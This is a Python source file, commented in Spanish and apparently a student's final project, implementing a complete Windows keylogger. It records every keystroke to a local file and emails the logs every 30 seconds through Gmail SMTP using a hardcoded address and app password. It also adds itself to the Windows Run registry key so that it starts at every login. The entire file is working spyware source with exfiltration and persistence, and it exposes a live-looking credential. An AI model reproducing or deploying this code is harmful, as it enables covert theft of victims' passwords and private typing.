import pynput.keyboard as keyboard  # Para capturar las pulsaciones del teclado.
import logging  # Para registrar las teclas pulsadas en un archivo.
import smtplib  # Para enviar correos electrónicos usando SMTP.
from email.mime.text import MIMEText  # Para crear mensajes de texto en correos.
from email.mime.multipart import MIMEMultipart  # Para crear correos con varias partes.
import time  # Para agregar pausas en la ejecución.
import os  # Para realizar operaciones relacionadas con el sistema operativo.
import threading  # Para ejecutar múltiples procesos simultáneamente.
import winreg as reg  # Para interactuar con el Registro de Windows.
import sys  # Para obtener información del sistema y los argumentos pasados al script.

# Ruta donde se almacenarán los logs de las pulsaciones del teclado.
destiny = 'C:/Users/susan/Documents/PracticaFinalKL-main/PracticaFinalKL-main/keylogs.txt'

# Configuración de las credenciales del correo electrónico.
sender_email = "proyectokeyloggeralgmal@gmail.com"  # Correo que enviará los registros.
receiver_email = "proyectokeyloggeralgmal@gmail.com"  # Correo que recibirá los registros.
password = "qipc pxcf sjev moks"  # Contraseña del correo (en este caso, probablemente una clave de aplicación).

# Función para enviar los registros por correo electrónico.
def send_email():
    while True:
        try:
            # Solo envía el correo si el archivo de registros no está vacío.
            if os.path.getsize(destiny) > 0:
                # Lee el contenido del archivo de registros.
                with open(destiny, 'r') as file:
                    data = file.read()
                
                # Configura el correo electrónico.
                msg = MIMEMultipart()
                msg['From'] = sender_email
                msg['To'] = receiver_email
                msg['Subject'] = 'Keylogger Logs'  # Asunto del correo.
                msg.attach(MIMEText(data, 'plain'))  # Agrega los datos como texto plano.

                # Configura y envía el correo usando SMTP.
                server = smtplib.SMTP('smtp.gmail.com', 587)  # Servidor SMTP de Gmail.
                server.ehlo()
                server.starttls()  # Inicia la conexión TLS.
                server.login(sender_email, password)  # Inicia sesión con las credenciales.
                server.send_message(msg)  # Envía el mensaje.
                server.quit()
                print("Email sent successfully")  # Mensaje de confirmación en consola.

                # Limpia el contenido del archivo de registros después de enviarlo.
                open(destiny, 'w').close()
        except Exception as e:
            print(f"Error: {e}")  # Imprime cualquier error ocurrido durante el envío.
        time.sleep(30)  # Espera 30 segundos antes de intentar enviar de nuevo.

# Función para agregar el keylogger al inicio del sistema.
def add_to_registry():
    # Obtiene la ruta completa del script actual.
    exe_path = os.path.join(os.getcwd(), sys.argv[0])
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"  # Clave del Registro donde se agregará el programa.
   
    try:
        # Abre la clave del Registro con permisos de escritura.
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE)
        # Crea una entrada en el Registro con el nombre "MyKeylogger" y la ruta del ejecutable.
        reg.SetValueEx(registry_key, "MyKeylogger", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(registry_key)  # Cierra la clave del Registro.
        print(f"Keylogger added to startup: {exe_path}")
    except Exception as e:
        print(f"Registry error: {e}")  # Maneja cualquier error durante la operación.

# Función que se ejecuta cada vez que se presiona una tecla.
def on_press(key):
    # Configura el archivo de logs y el formato de registro.
    logging.basicConfig(filename=destiny, level=logging.DEBUG, format='%(message)s')
    try:
        # Registra un espacio si se presiona la barra espaciadora.
        if key == keyboard.Key.space:
            logging.log(10, ' ')
            print('Key: Space')
        # Registra un salto de línea si se presiona Enter.
        elif key == keyboard.Key.enter:
            logging.log(10, '\n')
            print('Key: Enter')
        # Elimina el último carácter del archivo si se presiona Backspace.
        elif key == keyboard.Key.backspace:
            with open(destiny, 'r') as file:
                data = file.read()
            data = data[:-1]  # Elimina el último carácter del texto.
            with open(destiny, 'w') as file:
                file.write(data)
        # Registra cualquier otra tecla alfanumérica.
        else:
            logging.log(10, key.char)
            print('Key: {0}'.format(key))
    except AttributeError:
        pass  # Ignora errores al intentar registrar teclas especiales (no alfanuméricas).

# Función principal para iniciar el listener del teclado.
def start():
    # Crea un listener que ejecuta `on_press` cada vez que se presiona una tecla.
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Mantiene el listener activo.

# Crea el archivo de registros si no existe.
if not os.path.exists(destiny):
    open(destiny, 'w').close()

# Ejecuta la función `send_email` en un hilo separado.
threading.Thread(target=send_email).start()

# Agrega el programa al Registro de Windows para que se inicie automáticamente.
add_to_registry()

# Inicia la captura de pulsaciones del teclado.
start()
